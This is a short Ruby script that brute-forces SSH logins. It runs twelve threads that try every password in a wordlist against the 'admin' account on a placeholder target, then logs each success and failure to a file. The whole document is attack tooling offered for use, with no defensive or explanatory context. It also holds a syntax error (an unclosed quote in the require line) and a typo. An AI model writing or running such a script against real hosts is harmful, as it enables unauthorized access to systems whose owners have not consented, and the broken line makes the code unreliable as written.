require 'net/ssh'
require 'thread

TARGET = 'IP'
USERNAME = 'admin'
PASSWORD_FILE = 'passwords.txt'
THREADS = 12
LOG_FILE = 'brute_force_log.txt'

passwords = File.readlines(PASSWORD_FILE).map(&:chomp)

queue =  Queue.new
passwords.each { |pass| queue << pass }

def log_attempt(password, success)
  File.open(LOG_FILE, 'a') do |file|
    status = success ? "[SUCCESS]" : "[FAIL]"
    file.puts "#{status} Tried: #{password}"
  end
end

def brute_force(target, username, queue)
  while !queue.empty?
    password = queue.pop(true) rescue nil
    break unless password

    begin
      Net::SSH.start(target, username, password: password, timeout: 3) do |ssh|
        puts "[+] Password found! #{password}"
        log_attempt(password, true)
        exit
      end
    rescue Net::SSH::AuthenticationFailed
      puts "[-] Failed: #{password}"
      log_attempt(password, false)
    rescue => e
      puts "[!] Error: #{e.message}"
    end
  end
end

threads = []
THREADS.times do
  threads << Thread.new { brute_force(TARGET, USERNAME, queue) }
end

threads.each(&:join)
puts "Brute-force attack finished. Chech '#{LOG_FILE}' for details."